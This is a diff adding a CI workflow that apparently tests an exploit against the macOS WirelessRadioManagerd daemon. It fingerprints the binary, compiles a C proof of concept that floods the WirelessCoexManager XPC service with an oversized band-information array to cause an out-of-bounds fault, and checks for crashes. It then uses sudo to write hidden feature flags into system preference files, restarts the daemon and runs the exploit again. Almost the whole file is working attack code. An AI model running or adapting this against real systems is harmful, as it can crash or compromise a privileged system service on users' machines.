@@ -1,0 +1,135 @@
+name: wcm-live
+on:
+  workflow_dispatch:
+
+jobs:
+  recon:
+    runs-on: macos-15
+    timeout-minutes: 12
+    steps:
+      - name: recon binary and daemon
+        run: |
+          set +e
+          echo "=== binary ==="
+          ls -la /usr/sbin/WirelessRadioManagerd 2>&1
+          file /usr/sbin/WirelessRadioManagerd 2>&1
+          codesign -dv /usr/sbin/WirelessRadioManagerd 2>&1 | head -8
+          echo "=== running? ==="
+          pgrep -lx WirelessRadioManagerd
+          launchctl print system/com.apple.WirelessRadioManager 2>&1 | head -18
+          echo "=== feature-flag related strings ==="
+          strings -a /usr/sbin/WirelessRadioManagerd 2>/dev/null | grep -iE "EnableULCA|activeCoexFeatures|activeFeatures|com.apple.radios|CoexFeatures" | sort -u | head -30
+          echo "=== 相关 plist ==="
+          ls -la /Library/Preferences/com.apple.radios.plist 2>&1
+          defaults read /Library/Preferences/com.apple.radios 2>&1 | head -20
+          echo "=== WiFi 硬件 ==="
+          system_profiler SPAirPortDataType 2>/dev/null | head -12
+          ioreg -l 2>/dev/null | grep -ci "applewifi\|IO80211" 
+
+      - name: build poc
+        run: |
+          set -x
+          mkdir -p /tmp/w
+          cat > /tmp/w/poc.c <<'EOF'
+          #include <xpc/xpc.h>
+          #include <dispatch/dispatch.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+
+          static const char *SVC = "com.apple.WirelessCoexManager";
+
+          static xpc_object_t send_sync(xpc_connection_t c, xpc_object_t msg, double t) {
+              dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+              __block xpc_object_t reply = NULL;
+              xpc_connection_send_message_with_reply(c, msg,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
+                  ^(xpc_object_t r) { reply = xpc_retain(r); dispatch_semaphore_signal(sem); });
+              if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(t*NSEC_PER_SEC))) != 0) return NULL;
+              return reply;
+          }
+
+          int main(int argc, char **argv) {
+              int nelem = (argc > 1) ? atoi(argv[1]) : 40;
+              xpc_connection_t c = xpc_connection_create_mach_service(SVC,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), 0);
+              if (!c) { printf("S1 create=0\n"); return 1; }
+              xpc_connection_set_event_handler(c, ^(xpc_object_t e) { (void)e; });
+              xpc_connection_resume(c);
+              printf("S1 create=1\n");
+
+              xpc_object_t reg = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(reg, "kMessageId", 1);
+              xpc_object_t a1 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(a1, "kWCMRegisterProcess_ProcessId", 3);
+              xpc_dictionary_set_value(reg, "kMessageArgs", a1);
+              xpc_object_t r2 = send_sync(c, reg, 3.0);
+              printf("S2 register_reply=%d\n", r2 != NULL);
+              if (r2) xpc_release(r2);
+
+              xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(m, "kMessageId", 2600);
+              xpc_object_t a = xpc_dictionary_create(NULL, NULL, 0);
+              const char *k[] = { "kWCMCellularNetworkConfiguration_ULCPConfig",
+                                  "kWCMCellularNetworkConfiguration_DLCPConfig", "kSubId" };
+              for (int i = 0; i < 3; i++) xpc_dictionary_set_int64(a, k[i], 0);
+              xpc_dictionary_set_value(m, "kMessageArgs", a);
+              xpc_object_t r3 = send_sync(c, m, 3.0);
+              printf("S3 msg2600_reply=%d\n", r3 != NULL);
+              if (r3) xpc_release(r3);
+
+              xpc_object_t arr = xpc_array_create(NULL, 0);
+              for (int i = 0; i < nelem; i++) {
+                  xpc_object_t e = xpc_dictionary_create(NULL, NULL, 0);
+                  xpc_dictionary_set_uint64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_DirectionMask", 1);
+                  xpc_dictionary_set_int64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_CenterFreq", 1000 + i);
+                  xpc_dictionary_set_double(e, "kWCMCellularNetworkConfiguration_BandInfoSet_Bandwidth", 10.0);
+                  xpc_array_append_value(arr, e);
+                  xpc_release(e);
+              }
+              xpc_object_t m4 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(m4, "kMessageId", 2600);
+              xpc_object_t a4 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_value(a4, "kWCMCellularNetworkConfiguration_BandInformationSet", arr);
+              xpc_dictionary_set_int64(a4, "kSubId", 0);
+              xpc_dictionary_set_value(m4, "kMessageArgs", a4);
+              printf("S4 sending %d elements...\n", nelem);
+              xpc_object_t r4 = send_sync(c, m4, 5.0);
+              printf("S4 oob_reply=%d\n", r4 != NULL);
+              if (r4) xpc_release(r4);
+              xpc_connection_cancel(c);
+              printf("DONE\n");
+              return 0;
+          }
+          EOF
+          clang -fblocks -O0 -o /tmp/w/poc /tmp/w/poc.c -framework Foundation || clang -fobjc-arc -fblocks -O0 -o /tmp/w/poc /tmp/w/poc.c -framework Foundation
+          ls -la /tmp/w/poc
+
+      - name: run poc (no feature flag)
+        run: |
+          set +e
+          echo "--- daemon before ---"; pgrep -lx WirelessRadioManagerd
+          /tmp/w/poc 40; echo "rc=$?"
+          sleep 2
+          echo "--- daemon after ---"; pgrep -lx WirelessRadioManagerd
+          echo "--- crash reports ---"; ls -lat ~/Library/Logs/DiagnosticReports/ 2>/dev/null | head -5
+          sudo ls -lat /Library/Logs/DiagnosticReports/ 2>/dev/null | head -5
+
+      - name: enable EnableULCA and retry
+        run: |
+          set +e
+          echo "=== 注入特性开关（多种候选位置）==="
+          sudo defaults write /Library/Preferences/com.apple.radios activeFeatures -array EnableULCA Bb20EndcSupport
+          sudo defaults write /Library/Preferences/com.apple.WirelessCoexManager activeCoexFeatures -array EnableULCA Bb20EndcSupport
+          sudo defaults write /Library/Preferences/com.apple.wirelesscoexmanager activeCoexFeatures -array EnableULCA
+          sudo plutil -p /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo launchctl kickstart -k system/com.apple.WirelessRadioManager 2>&1
+          sleep 6
+          pgrep -lx WirelessRadioManagerd
+          echo "--- retry poc ---"
+          /tmp/w/poc 40; echo "rc=$?"
+          sleep 3
+          echo "--- daemon after retry ---"; pgrep -lx WirelessRadioManagerd
+          echo "--- crash reports ---"; sudo ls -lat /Library/Logs/DiagnosticReports/ 2>/dev/null | head -5
+          echo "--- log tail ---"
+          log show --last 2m --predicate 'process == "WirelessRadioManagerd"' 2>/dev/null | tail -25
